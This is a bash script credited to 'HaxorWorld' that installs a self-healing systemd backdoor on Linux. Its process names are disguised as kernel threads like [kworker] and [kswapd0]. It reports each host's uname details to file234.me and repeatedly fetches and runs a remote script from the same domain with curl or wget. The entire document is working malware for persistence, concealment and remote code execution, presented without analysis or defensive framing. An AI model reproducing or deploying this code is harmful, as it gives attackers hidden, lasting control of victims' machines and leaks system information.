#!/bin/bash
# Code By HaxorWorld

healing="/usr/local/bin/self"
self="/etc/systemd/system/self.service"
hook="https://file234.me/i.php"  
service="defunct"
pid_file="/var/run/self.pid"

proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")

PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"

cat << EOF > "$healing"
#!/bin/bash

host=\$(uname -a)
hook="$hook"
service="$service"
pid_file="$pid_file"

choose_random_proc_name() {
    proc_names=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
    echo "\${proc_names[\$((RANDOM % \${#proc_names[@]}))]}"
}

exec -a "$PROC_HIDDEN_NAME_DEFAULT" /bin/bash -c '

check_pid() {
    if [ -f "$pid_file" ]; then
        if ps -p "\$(cat $pid_file)" > /dev/null 2>&1; then
            return 0
        else
            return 1
        fi
    else
        return 1
    fi
}

write_pid() {
    echo $$ > "$pid_file"
}

cleanup() {
    rm -f "$pid_file"
}
trap cleanup EXIT

write_pid

while true; do
    if systemctl is-active --quiet "$service"; then
        RANDOM_SLEEP_NAME="\$(choose_random_proc_name)"
        exec -a "\$RANDOM_SLEEP_NAME" sleep 3  
    else
        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_down&&host=$(uname -a)" "$hook"
        
        bash -c "\$(curl -fsSL https://file234.me/z)" || bash -c "\$(wget -qO- https://file234.me/z)"

        if systemctl is-active --quiet "$service"; then
            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_up&&host=$(uname -a)" "$hook"
        else
            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_fail&&host=$(uname -a)" "$hook"
        fi
    fi
done
'
EOF

chmod +x "$healing"

cat << EOF > "$self"
[Unit]
Description=Self Service

[Service]
ExecStart=$healing
Restart=always
RestartSec=10
PIDFile=$pid_file

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable self.service
systemctl start self.service


status_output=$(systemctl status self.service 2>&1)
if echo "$status_output" | grep -q "active (running)"; then
    if ! echo "$status_output" | grep -q "Failed"; then
        if echo "$status_output" | grep -q "self.service"; then
            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_already_injected&host=$(uname -a)" "$hook"
        else
            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_injected&host=$(uname -a)" "$hook"
        fi
    else
        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_error&host=$(uname -a)" "$hook"
    fi
else
    curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_not_running&host=$(uname -a)" "$hook"
fi
